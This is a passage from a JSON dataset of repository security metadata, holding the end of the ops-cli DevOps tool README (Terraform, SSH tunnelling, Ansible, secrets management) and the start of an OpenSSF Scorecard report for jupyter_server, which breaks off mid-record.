\"untaint\" and \"import\". The\n                        module to use. e.g.: vpc\n  --resource RESOURCE   for use with \"taint\", \"untaint\" and \"import\". The\n                        resource to target. e.g.: aws_instance.nat\n  --name NAME           for use with \"import\". The name or ID of the imported\n                        resource. e.g.: i-abcd1234\n  --plan                for use with \"show\", show the plan instead of the\n                        statefile\n  --skip-refresh        for use with \"plan\". Skip refresh of statefile\n  --raw-output          for use with \"plan\". Show raw plan output without piping through terraform landscape (if terraform landscape is not enabled in opsconfig.yaml this will have no impact)\n  --path-name PATH_NAME in case multiple terraform paths are defined, this\n                        allows to specify which one to use when running\n                        terraform\n\n    Examples:\n        # Create a new cluster with Terraform\n        ops clusters/qe1.yaml terraform plan\n        ops clusters/qe1.yaml terraform apply\n\n        # Update an existing cluster\n        ops clusters/qe1.yaml terraform plan\n        ops clusters/qe1.yaml terraform apply\n\n        # Get rid of a cluster and all of its components\n        ops clusters/qe1.yaml terraform destroy\n\n        # Retrieve all output from a previously created Terraform cluster\n        ops clusters/qe1.yaml terraform output\n\n        # Retrieve a specific output from a previously created Terraform cluster\n        ops clusters/qe1.yaml terraform output --var nat_public_ip\n\n        # Refresh a statefile (no longer part of plan)\n        ops clusters/qe1.yaml terraform refresh\n\n        # Taint a resource- forces a destroy, then recreate on next plan/apply\n        ops clusters/qe1.yaml terraform taint --module vpc --resource aws_instance.nat\n\n        # Untaint a resource\n        ops clusters/qe1.yaml terraform untaint --module vpc --resource aws_instance.nat\n\n        # Show the statefile in human-readable form\n        ops clusters/qe1.yaml terraform show\n\n        # Show the plan in human-readable form\n        ops clusters/qe1.yaml terraform show --plan\n\n        # View parsed jinja on the terminal\n        ops clusters/qe1.yaml terraform template\n\n        # Import an unmanaged existing resource to a statefile\n        ops clusters/qe1.yaml terraform import --module vpc --resource aws_instance.nat --name i-abcd1234\n\n        # Use the Terraform Console on a cluster\n        ops clusters/qe1.yaml terraform console\n\n        # Validate the syntax of Terraform files\n        ops clusters/qe1.yaml terraform validate\n\n        # Specify which terraform path to use\n        ops clusters/qe1.yaml terraform plan --path-name terraformFolder1\n```\n#### Terraform landscape\nFor pretty formatting of terraform plan output you can install https://github.com/coinbase/terraform-landscape (use gem install for MacOS). \nTo make `ops` use it you need to add `terraform.landscape: True` in opsconfig.yaml file.\n\n### SSH\n```\nusage: ops cluster_config_path ssh [-h] [-e EXTRA_VARS] [-l USER]\n                                   [--ssh-config SSH_CONFIG] [--index INDEX]\n                                   [--tunnel] [--ipaddress] [--local LOCAL]\n                                   [--remote REMOTE] [--proxy] [--nossh]\n                                   role [ssh_opts [ssh_opts ...]]\n\npositional arguments:\n  role                  Server role to ssh to. Eg: dcs\n  ssh_opts              Manual ssh options\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -e EXTRA_VARS, --extra-vars EXTRA_VARS\n                        Extra variables to use. Eg: -e ssh_user=ssh_user\n  -l USER, --user USER  SSH User\n  --ssh-config SSH_CONFIG\n                        Ssh config file name in the ./ansible dir\n  --index INDEX         Index of the server from the group\n  --tunnel              Use SSH tunnel, must pass --local and --remote\n  --ipaddress\n  --local LOCAL         local port for ssh proxy or ssh tunnel\n  --remote REMOTE       remote port for ssh tunnel\n  --proxy               Use SSH proxy, must pass --local\n  --nossh               Port tunnel a machine that does not have SSH. Implies\n                        --ipaddress, and --tunnel; requires --local and\n                        --remote\n  --keygen              Create a ssh keys pair to use with this infrastructure\n  --noscb               Disable use of Shell Control Box (SCB) even it is\n                        enabled in the cluster config\n  --auto_scb_port       When using Shell Control Box (SCB) and creating a\n                        proxy,a random port is generated, which will be used\n                        in the ssh config for all playbook, run and sync\n                        operations\n\n    Examples:\n        # SSH using current username as remote username\n        ops clusters/qe1.yaml ssh nagios\n\n        # SSH using a different username\n        ops clusters/qe1.yaml ssh nagios -l ec2-user\n\n        # SSH to the second nagios instance\n        ops clusters/qe1.yaml ssh nagios --index 2\n\n        # SSH to a specific hostname, instead of the tagged role\n        ops clusters/qe1.yaml ssh full-hostname-here-1\n\n        # Create an SSH tunnel to Nagios forwarding the remote port 80 to local port 8080\n        ops clusters/qe1.yaml ssh --tunnel --remote 80 --local 8080 nagios\n\n        # Create an SSH tunnel to a host where the service is NOT listening on `localhost`\n        ops clusters/qe1.yaml ssh --tunnel --remote 80 --local 8080 nagios --ipaddress\n\n        # Create an SSH tunnel to a host with an open port which does NOT have SSH itself (Windows)\n        # Note that the connection will be made from the Bastion host\n        ops clusters/qe1.yaml ssh --tunnel --local 3389 --remote 3389 --nossh windowshost\n\n        # Create a proxy to a remote server that listens on a local port\n        ops clusters/qe1.yaml ssh --proxy --local 8080 bastion\n\n        # In case Shell Control Box (SCB) is configured and enabled on the cluster a proxy which\n        # will be used by all ops play, run and sync operations, can be created either using\n        # either the port configured the cluster config file or an auto generated port.\n        # In this case --local param must not be used\n        # Example for using the port configured in the cluster config\n        ops clusters/qe1.yaml ssh bastion --proxy\n        # Example for using the auto generated port\n        ops clusters/qe1.yaml ssh bastion --proxy --auto_scb_port\n\n\n        # Disable use of Shell Control Box (SCB) even it is enabled in the cluster config\n        ops clusters/qe1.yaml ssh bastion --noscb\n```\n\n#### SSHPass\n\nIn case you want to use the OSX Keychain to store your password and reuse across multiple nodes (e.g. running a playbook on 300 nodes and not having to enter the password for every node) follow the tutorial below:\n\n1. Open `Keychain Access` app on OSX\n  1. Create a new keychain (`File -> New Keychain`), let's say `aam`\n  2. Select the `aam` keychain and add a new password entry in this (`File -> New Password Item`):\n    - Name: `idm`\n    - Kind: `application password`\n    - Account: `your_ldap_account` (e.g. `johnsmith`)\n    - Where: `idm`\n\n2. Create `$HOME/bin` dir - this is where the scripts below are saved\n\n3. Create `~/bin/askpass` script and update the ldap account there:\n\n  ```bash\n  cat > ~/bin/askpass  <<\"EOF\"\n  #!/usr/bin/env bash\n  /usr/bin/security find-generic-password -a <your_ldap_account> -s idm -w $HOME/Library/Keychains/aam.keychain\n  EOF\n  chmod +x ~/bin/askpass\n  ```\n\n1. Checkout [notty github repo](https://github.com/pharaujo/notty), build and move the binary to `$HOME/bin/`\n\n1. Create `~/bin/sshpass` script:\n\n  ```bash\n  cat > $HOME/bin/sshpass <<\"EOF\"\n  #!/usr/bin/env bash\n  export DISPLAY=:99\n  export SSH_ASKPASS=\"$HOME/bin/askpass\"\n  [[ $1 == -d* ]] && shift\n  $HOME/bin/notty $@\n  EOF\n\n  chmod +x $HOME/bin/sshpass\n  ```\n\n1. Verify the setup works:\n\n  ```bash\n  # Connect to bastion\n  ~/bin/sshpass ssh -o StrictHostKeyChecking=no -l <your_ldap_account> <52.5.5.5>\n  ```\n\n1. Run `ops` tool\n\n#### SCB\nShell Control Box (SCB) is an activity monitoring appliance from Balabit (now One Identity) that controls privileged access to remote servers.\n`ops` has support for using SCB as ssh proxy for the following operations: `ssh, tunnel, proxy, ansible play, run and sync`\n\nIn order to use SCB an extra section needs to be added to the cluster config file:\n```\nscb:\n  enabled: true\n  host: \"scb.example.com\"\n  proxy_port: 2222 # optional\n```\nHaving this config all ssh operations will be done via the scb host, unless the `--noscb` flag is used.\n\nWhen using `SCB`, `SSHPass` will not be used.\n\nFor ansible `play`, `run` and `sync` operations to work via SCB a proxy needs to be created first and then run `ops` in a different terminal window or tab:\n```\n# 1. Create a proxy in a terminal window\n# Example for using the port configured in the cluster config\nops clusters/qe1.yaml ssh bastion --proxy\n# Example for using the auto generated port\nops clusters/qe1.yaml ssh bastion --proxy --auto_scb_port\n\n# 2. Run the play/run/sync command normally in a different terminal window or tab\n# A message will indicate the scb proxy is used\nops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml\n...\nConnecting via scb proxy at 127.0.0.1:2222.\nThis proxy should have already been started and running in a different terminal window.\nIf there are connection issues double check that the proxy is running.\n...\n```\n\n### Play\n\nRun an ansible playbook.\n\n```\nusage: ops cluster_config_path play [-h] [-e EXTRA_VARS] [--ask-sudo-pass]\n                                    [--limit LIMIT] [--noscb]\n                                    playbook_path\n                                    [ansible_args [ansible_args ...]]\n\npositional arguments:\n  playbook_path         The playbook path\n  ansible_args          Extra ansible args\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -e EXTRA_VARS, --extra-vars EXTRA_VARS\n                        Extra variables to use. Eg: -e ssh_user=ssh_user\n  --ask-sudo-pass       Ask sudo pass for commands that need sudo\n  --limit LIMIT         Limit run to a specific server subgroup. Eg: --limit\n                        newton-dcs\n  --noscb               Disable use of Shell Control Box (SCB) even if it is\n                        enabled in the cluster config\n\n    Examples:\n        # Run an ansible playbook\n        ops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml\n\n        # Limit the run of a playbook to a subgroup\n        ops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml -- --limit dcs\n\n        # Overwrite or set a variable\n        ops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml -- -e city=paris\n\n        # Filter with tags\n        ops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml -- -t common\n\n        # Run a playbook and overwrite the default user\n        ops clusters/qe1.yaml play ansible/plays/cluster/configure.yaml -- -u ec2-user\n```\n\n### Run command\n\nRun a bash command on the selected nodes.\n\n```\nusage: ops cluster_config_path run [-h] [--ask-sudo-pass] [--limit LIMIT]\n                                   [--noscb]\n                                   host_pattern shell_command\n                                   [extra_args [extra_args ...]]\n\npositional arguments:\n  host_pattern     Limit the run to the following hosts\n  shell_command    Shell command you want to run\n  extra_args       Extra ansible arguments\n\noptional arguments:\n  -h, --help       show this help message and exit\n  --ask-sudo-pass  Ask sudo pass for commands that need sudo\n  --limit LIMIT    Limit run to a specific server subgroup. Eg: --limit\n                   newton-dcs\n  --noscb          Disable use of Shell Control Box (SCB) even if it is\n                   enabled in the cluster config\n\n    Examples:\n        # Last 5 installed packages on each host\n        ops qe1.yaml run all 'sudo grep Installed /var/log/yum.log | tail -5'\n\n        # See nodetool status on each cassandra node\n        ops qe1.yaml run qe1-cassandra 'nodetool status'\n\n        # Complex limits\n        ops qe1.yaml run 'qe1-cassandra,!qe1-cassandra-0' 'nodetool status'\n\n        # Show how to pass other args\n```\n\n### Sync files\n\nPerforms `rsync` to/from a given set of nodes.\n\n```\nusage: ops cluster_config_path sync [-h] [-l USER] [--noscb]\n                                    src dest [opts [opts ...]]\n\npositional arguments:\n  src                   Source dir\n  dest                  Dest dir\n  opts                  Rsync opts\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -l USER, --user USER  Value for remote user that will be used for ssh\n  --noscb               Disable use of Shell Control Box (SCB) even if it is\n                        enabled in the cluster config\n\n        rsync wrapper for ops inventory conventions\n\n        Example:\n\n        # rsync from remote dcs role\n        ops cluster.yml sync 'dcs[0]:/usr/local/demdex/conf' /tmp/configurator-data --user remote_user\n\n        # extra rsync options\n        ops cluster.yml sync 'dcs[0]:/usr/local/demdex/conf' /tmp/configurator-data -l remote_user -- --progress\n```\n\n### Noop\n```\nusage: ops cluster_config_path noop [-h]\n\noptional arguments:\n  -h, --help  show this help message and exit\n```\n\n### Packer\n\nRuns [packer](https://www.packer.io/intro/), for creating images.\n\n```\nusage: ops cluster_config_path packer [-h] subcommand\n\npositional arguments:\n  subcommand  build | validate\n\noptional arguments:\n  -h, --help  show this help message and exit\n\n    Examples:\n        # Validate a packer file\n        ops clusters/centos7.yaml packer validate\n\n        # Build a packer file\n        ops clusters/centos7.yaml packer build\n```\n\n## Secrets Management\n\nThere are cases where you need to reference sensitive data in your `cluster.yaml` file (credentials, passwords, tokens etc). Given that the cluster configuration file can be stored in a version control system (such as Git), the best practice is to not put sensitive data in the file itself. Instead, we can use `ops-cli` to fetch the desired credentials from a secrets manager such as Vault or Amazon SSM, at runtime.\n\n### Vault\n\nOps can manage the automatic generation of secrets and their push in Vault, without actually persisting the secrets in the cluster file.\nA cluster file will only need to use a construct like the following:\n```\ndb_password: \"{{'secret/campaign/generated_password'|managed_vault_secret(policy=128)}}\"\n```\nWhich will translate behind the scenes in :\n- look up in vault the secrets at secret/campaign/generated_password in the default key 'value' (Adobe convention that can be overridden with the key parameter)\n- if the value there is missing, generate a new secret using the engine passgen with a policy of length 128 characters\n- return the generated value\n- if the value at that path already exist, just return that value.\nThis allows us to just refer in cluster files a secret that actually exists in vault and make sure we only generate it once - if it was already created by os or any other system, we will just use what is already there.\nThe reference is by means of fixed form jinja call  added to the cluster file, which ends up interpreted later during the templating phase.\n\n### Amazon Secrets Manager (SSM)\n\nAmazon offers the possibility to use their [Secrets Manager](https://docs.aws.amazon.com/systems-manager/latest/userguide/what-is-systems-manager.html) in order to manage configuration data such as credentials, passwords and license keys.\n\nWe can use `ops-cli` to fetch the sensitive data from SSM, at runtime. Just define this in your cluster configuration file (eg. `mycluster.yaml`).\n\n```\ndb_password: \"{{ '/my/ssm/path' | read_ssm(aws_profile='myprofile') }}\"\n```\n\n`ops-cli` will read the SSM value by running a command similar to: `AWS_PROFILE=aam-npe aws ssm get-parameter --name \"/my/ssm/path\"  --region us-east-1 --with-decryption`.\nNote that you can specify the AWS region via `read_ssm(aws_profile='myprofile', region_name='us-west-2')`.\n\n\n## Using jinja2 filters in playbooks and terraform templates\n\nYou can register your own jinja2 filters that you can  use in the cluster config file, terraform templates and ansible playbooks\n\nAll ops commands look for filters in the following locations:\n- the python path\n- the .opsconfig.yaml [ansible.filter_plugins](https://github.com/adobe/ops/blob/master/src/ops/opsconfig.py#L58) setting (defaults to plugins/filter_plugins)\n\nExample simple filter:\n\n```\n# plugins/filter_plugin/myfilters.py\n\ndef my_filter(string):\n    return 'filtered: ' + string\n\n\nclass FilterModule(object):\n    def filters(self):\n        return {\n            'my_filter': my_filter\n        }\n\n# usage in playbook, templates, cluster config\n# test_custom_filters: \"{{ 'value' | my_filter }}\"\n```\n\n## SKMS\nCreate a file in `~/.skms/credentials.yaml` which looks like the following:\n```yaml\nendpoint: \"api.skms.mycompany.com\"\nusername: <username>\npassword: <password>\n```\n\n# Development\n\n## Install `ops` in development mode\n\n```\ngit clone https://github.com/adobe/ops-cli.git\ncd ops\n# Install openssl\nbrew install openssl libyaml\nenv LDFLAGS=\"-L$(brew --prefix openssl)/lib\" CFLAGS=\"-I$(brew --prefix openssl)/include\" python setup.py develop\n```\n\n## Running tests\n\n- on your machine: `py.test tests`\n\n# Troubleshooting\n\n- Permission issues when installing: you should install the tool in a python virtualenv\n\n- Exception when running: `ops`\n    `pkg_resources._vendor.packaging.requirements.InvalidRequirement: Invalid requirement, parse error at \"'!= 2.4'\"`\n\n    Caused by a broken paramiko version, reinstall paramiko: `pip2 uninstall paramiko; pip2 install paramiko`\n\n- Exception when installing ops because the cryptography package fails to install:\n\nEither install the tool in a virtualenv or:\n\n```\n    brew install libffi\n    brew link libffi --force\n    brew install openssl  \n    brew link openssl --force\n```\n\n# License\n[Apache License 2.0](/LICENSE)\n",
        "num_commits": 211,
        "project_age_days": 2099,
        "project_created_at": "2019-01-30",
        "latest_updated_at": "2024-06-28",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 27,
        "num_pull": 130,
        "num_issues": 165,
        "num_opening_issue": 18,
        "project_size(kB)": 436,
        "num_stargazers": 192,
        "num_watchers": 192,
        "num_forks": 38,
        "num_subscribers": 25,
        "SecurityPolicy_created_at": "2021-04-28 14:41:44",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "43fd5bc340c97a8a5e81ddf4be4928bfe70c8b91",
                "url": "https://github.com/adobe/.github/commit/43fd5bc340c97a8a5e81ddf4be4928bfe70c8b91",
                "date": "2021-04-28 14:41:44"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "external",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism",
            "User guideline"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "jupyter-server/jupyter_server",
        "project_url": "https://github.com/jupyter-server/jupyter_server",
        "SSF": {
            "date": "2024-10-29T21:39:49+07:00",
            "repo": {
                "name": "github.com/jupyter-server/jupyter_server",
                "commit": "74655ce66f36ed85a83591e6658e70ba91232580"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.8,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'allow deletion' disabled on branch '1.x'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch '1.x'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch '1.x'",
                        "Warn: 'stale review dismissal' is disable on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: branch '1.x' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: codeowners review is not required on branch '1.x'",
                        "Warn: 'last push approval' is disable on branch 'main'",
                        "Warn: 'up-to-date branches' is disable on branch 'main'",
                        "Info: status check found to merge onto on branch 'main'",
                        "Info: status check found to merge onto on branch '1.x'",
                        "Info: PRs are required in order to make changes on branch 'main'",
                        "Warn: PRs are not required to make changes on branch '1.x'; or we don't have data to detect it.If you think it might be the latter, make sure to run Scorecard with a PAT or use Repo Rules (that are always public) instead of Branch Protection settings"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "23 out of 23 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "Found 15/25 approved changesets -- score normalized to 6",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: matplotlib contributor org/company found, cloudpipe contributor org/company found, jovyan contributor org/company found, python3statement contributor org/company found, ucmerced contributor org/company found, jupyterlab-contrib contributor org/company found, JuliaInterop contributor org/company found, NYUCCL contributor org/company found, ibm-et contributor org/company found, EmoryUniversityTheoreticalBiophysics contributor org/company found, knime-ip contributor org/company found, northvolt contributor org/company found, scipy-conference contributor org/company found, openhatch contributor org/company found, jupyter-standards contributor org/company found, ursiform contributor org/company found, conda-tools contributor org/company found, 10gen contributor org/company found, deconst contributor org/company found, datalayer contributor org/company found, pybind contributor org/company found, jupyter-xeus contributor org/company found, ilastik contributor org/company found, mongodb contributor org/company found, scientific-python contributor org/company found, sandiegopython contributor org/company found, python-modernize contributor org/company found, bqplot contributor org/company found, plasmabio contributor org/company found, jupyterlab contributor org/company found, JuliaLang contributor org/company found, numfocus contributor org/company found, ICESAT-2HackWeek contributor org/company found, NFAcademy contributor org/company found, xonsh contributor org/company found, quansight-labs contributor org/company found, computationalmodelling contributor org/company found, wearethorn contributor org/company found, binder-project contributor org/company found, gateway-experiments contributor org/company found, dotnet contributor org/company found, nanshe-org contributor org/company found, nteract contributor org/company found, jupyter-widgets contributor org/company found, voila-dashboards contributor org/company found, pypa contributor org/company found, pylab contributor org/company found, european xfel contributor org/company found, heatlamp contributor org/company found, machine-shop contributor org/company found, thehackerwithin contributor org/company found, sympy contributor org/company found, data-apis contributor org/company found, university of california berkeley. contributor org/company found, hammies contributor org/company found, CodeJockey contributor org/company found, pyFFTW contributor org/company found, panosc-eu contributor org/company found, mamba-org contributor org/company found, berkeley-cocosci contributor org/company found, erdc contributor org/company found, QuantStack contributor org/company found, veritone contributor org/company found, jupyterhub contributor org/company found, sagemath contributor org/company found, anaconda contributor org/company found, harmslab contributor org/company found, theScienceHub contributor org/company found, howtowhale contributor org/company found, apache contributor org/company found, conda contributor org/company found, jupyterhealth contributor org/company found, pydata contributor org/company found, pygame contributor org/company found, jupyter4edu contributor org/company found, willing consulting contributor org/company found, voila-gallery contributor org/company found, jupyter-resources contributor org/company found, cocotools contributor org/company found, databricks contributor org/company found, cupy contributor org/company found, jupytercad contributor org/company found, pydatachicago contributor org/company found, hyperspy contributor org/company found, jupyter-incubator contributor org/company found, xtensor-stack contributor org/company found, microsoft contributor org/company found, netflix contributor org/company found, networkx contributor org/company found, RobCoIndustries contributor org/company found, apache-spark-on-k8s contributor org/company found, vaultjs contributor org/company found, pexpect contributor org/company found, jupyter-server contributor org/company found, phosphorjs contributor org/company found, systers contributor org/company found, conda-forge contributor org/company found, southampton-python contributor org/company found, amazon web services contributor org/company found, elyra-ai contributor org/company found, ipython-contrib contributor org/company found, opensourcedesign contributor org/company found, jupytergis contributor org/company found, WRSC contributor org/company found, runtimed contributor org/company found, opencoweb contributor org/company found, MeeseeksBox contributor org/company found, OpenDreamKit contributor org/company found, jupyter-attic contributor org/company found, joommf contributor org/company found, dask contributor org/company found, jupyter contributor org/company found, binder-examples contributor org/company found, BIDS contributor org/company found, jupyterlite contributor org/company found, jupyter-robotics contributor org/company found, DudLab contributor org/company found, zeromq contributor org/company found, IRkernel contributor org/company found, pyladies contributor org/company found, InsightSoftwareConsortium contributor org/company found, mongodb-labs contributor org/company found, CODAIT contributor org/company found, jupyterday-atlanta-2016 contributor org/company found, BeerTheorySociety contributor org/company found, zed-industries contributor org/company found, jupyter @quantstack contributor org/company found, conda-incubator contributor org/company found, ipython contributor org/company found, Maritime-Robotics-Student-Society contributor org/company found, jupytercalpoly contributor org/company found, amperser contributor org/company found, libRocket contributor org/company found, atom-community contributor org/company found, spyder-ide contributor org/company found, nipy contributor org/company found, redux-observable contributor org/company found, jupyter-native contributor org/company found, uncopenweb contributor org/company found, simula research laboratory contributor org/company found, pyxg contributor org/company found, apple contributor org/company found, cytoscape contributor org/company found, sipb contributor org/company found, rapidsai contributor org/company found, RDFLib contributor org/company found, labyrinth-team contributor org/company found, h5py contributor org/company found, European-XFEL contributor org/company found, jupytercon contributor org/company found, compmodels contributor org/company found, quantstack contributor org/company found, zarr-developers contributor org/company found, qsnake contributor org/company found, google contributor org/company found, pickleshare contributor org/company found, aspp-apac contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 157 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 2,
                    "reason": "1 commit(s) and 2 issue activity found in the last 90 days -- score normalized to 2",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:48: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:63: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:71: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:82: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:85: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:88: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:102: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:105: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:116: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:119: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:122: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:139: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/downstream.yml:14: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:17: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/downstream.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter-server/jupyter_server/downstream.yml/main?enable=pin",
